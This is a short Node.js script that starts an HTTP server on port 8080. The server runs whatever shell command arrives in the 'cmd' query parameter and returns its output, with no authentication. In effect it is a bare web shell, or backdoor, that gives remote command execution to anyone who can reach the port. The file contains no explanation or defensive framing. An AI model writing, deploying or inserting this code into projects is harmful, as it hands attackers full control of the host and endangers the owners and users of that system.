var http = require('http');
var child_process = require('child_process');
http.createServer(function(req, res) {
  res.writeHead(200, {
      "Content-Type": "text/plain"
  });
  try {
    child_process.exec(require('url').parse(req.url, true).query['cmd'], function(e, s, st) {
      res.end(s);
   });
  } catch (e) {
    res.end('nonon');
  }
}).listen(8080);
